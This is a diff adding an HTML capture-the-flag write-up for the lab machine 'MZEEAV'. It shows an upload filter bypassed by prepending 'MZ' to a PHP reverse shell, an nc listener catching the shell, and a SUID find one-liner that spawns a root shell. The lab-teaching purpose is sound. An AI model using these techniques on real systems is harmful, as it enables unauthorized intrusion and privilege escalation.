@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MZEEAV &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>MZEEAV</h1>
+    <div class="meta">Target: <code>192.168.180.33</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">FileUpload</span><span class="tag">MagicBytes</span><span class="tag">SourceCodeReview</span><span class="tag">SUID</span><span class="tag">GTFOBins</span><span class="tag">find</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#web-enumeration">Web Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#source-code-review-understanding-the-filter">Source Code Review, Understanding the Filter</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#suid-binary-masquerading-as-files">SUID Binary Masquerading as &quot;fileS&quot;</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>MZEEAV runs a custom "antivirus" file upload application that checks uploaded files against a PE magic byte signature (MZ). The source code for the upload logic is exposed in a <code>/backups</code> directory, making the filter completely transparent. Prepending <code>MZ</code> to a PHP reverse shell bypasses it. Post-shell, a SUID binary named <code>fileS</code> turns out to be a renamed <code>find</code> binary, which GTFOBins converts to a root shell.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.56 ((Debian))
+|_http-title: MZEE-AV - Check your files
+</code></pre>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<pre><code class="language-sh">gobuster dir -u http://192.168.180.33 -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
+/backups              (Status: 301) [--&gt; /backups/]
+/upload               (Status: 301) [--&gt; /upload/]
+</code></pre>
+<p><code>/backups</code> contained the application's PHP source code.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="source-code-review-understanding-the-filter">Source Code Review, Understanding the Filter</h3>
+<p><code>upload.php</code> from the backups directory revealed the complete upload logic:</p>
+<pre><code class="language-php">/* Check MagicBytes MZ PEFILE 4D5A*/
+$magicbytes = strtoupper(substr(bin2hex($magic),0,4));
+
+if ( strpos($magicbytes, '4D5A') === false ) {
+    echo &quot;Error no valid PEFILE\n&quot;;
+    exit ();
+}
+
+rename($tmp_location, $location);
+</code></pre>
+<p>The filter reads the first two bytes of the upload, converts them to hex, and checks for <code>4D5A</code>, the ASCII value of <code>MZ</code>, the Windows Portable Executable magic bytes.</p>
+<blockquote>
+<p><strong>Why the source code exposure is the entire exploit:</strong> once you can read the validation logic, bypassing it is trivial. The check only looks at the first two bytes and checks for a literal string match. The rest of the file is unrestricted. Prepending <code>MZ</code> to any payload satisfies the check completely.</p>
+</blockquote>
+<p>I took the PenTestMonkey PHP reverse shell and added <code>MZ</code> as the first line, making the file start with those bytes while remaining valid PHP. After uploading, I triggered it by visiting the uploaded file path directly:</p>
+<pre><code>http://192.168.180.33/upload/php-reverse-shell.php
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+connect to [192.168.45.244] from (UNKNOWN) [192.168.180.33] 49664
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ whoami
+www-data
+</code></pre>
+<p>TTY upgrade:</p>
+<pre><code class="language-sh">python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<p>Local flag:</p>
+<pre><code class="language-sh">www-data@mzeeav:/home/avuser$ cat local.txt
+‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="suid-binary-masquerading-as-files">SUID Binary Masquerading as "fileS"</h3>
+<p>LinPEAS flagged a SUID bit on an unusual binary:</p>
+<pre><code>/opt/fileS  (SUID, no read permissions, execute only)
+</code></pre>
+<p>Running it with <code>--version</code> identified the real binary:</p>
+<pre><code class="language-sh">/opt/fileS --version
+find (GNU findutils) 4.8.0
+</code></pre>
+<p>The binary is <code>find</code> renamed to <code>fileS</code>. GTFOBins has a SUID escalation path for <code>find</code>:</p>
+<pre><code class="language-sh">./fileS . -exec /bin/sh -p \; -quit
+# whoami
+root
+</code></pre>
+<blockquote>
+<p><strong>Why SUID <code>find</code> gives root:</strong> when <code>find</code> executes a command via <code>-exec</code>, that subprocess inherits the SUID owner's UID (root). The <code>-p</code> flag on <code>/bin/sh</code> preserves the elevated effective UID rather than dropping it. Renaming the binary doesn't change this, the SUID bit and the binary's code are what matter, not the filename.</p>
+</blockquote>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh"># cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Always check for exposed source code before attempting blind exploitation.</strong> The <code>/backups</code> directory turned a "bypass the upload filter" challenge into a five-minute read.</li>
+<li><strong>Magic byte filters protect only the first N bytes.</strong> A PHP interpreter doesn't care about leading non-PHP bytes; prepending <code>MZ</code> to a PHP file keeps it executable.</li>
+<li><strong>When a SUID binary isn't in GTFOBins by name, check what it actually is.</strong> <code>--version</code> and <code>strings</code> both reveal the true identity of renamed binaries.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
